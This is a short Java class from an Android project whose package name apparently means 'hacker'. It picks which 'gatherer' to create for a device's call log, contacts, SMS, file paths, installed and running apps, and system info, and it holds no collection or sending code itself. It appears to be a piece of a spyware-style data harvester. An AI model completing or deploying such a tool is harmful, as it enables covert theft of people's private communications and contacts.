package com.example.student.hatsker;

import android.content.Context;

/**
 * Created by Игорь on 25.07.2017.
 */

public class GathererBuilder {

    private final int CALL_LOG_GATHERER = 1;
    private final int CONTACTS_GATHERER = 2;
    private final int FILES_PATHS_GATHERER = 3;
    private final int INSTALLED_APPS_GATHERER = 4;
    private final int RUNNING_APPS_GATHERER = 5;
    private final int SMS_GATHERER = 6;
    private final int SYSTEM_INFO_GATHERER = 7;

    GathererBuilder(int code, Context context)
    {
        switch (code)
        {
            case CALL_LOG_GATHERER: new CallLogGatherer(context);
                break;
            case CONTACTS_GATHERER: new ContactsGatherer(context);
                break;
            case FILES_PATHS_GATHERER: new FilesPathsGatherer(context);
                break;
            case INSTALLED_APPS_GATHERER: new InstalledAppsGatherer(context);
                break;
            case RUNNING_APPS_GATHERER: new RunningAppsGatherer(context);
                break;
            case SMS_GATHERER: new SmsGatherer(context);
                break;
            case SYSTEM_INFO_GATHERER: new SystemInfoGatherer(context);
                break;
        }
    }
}
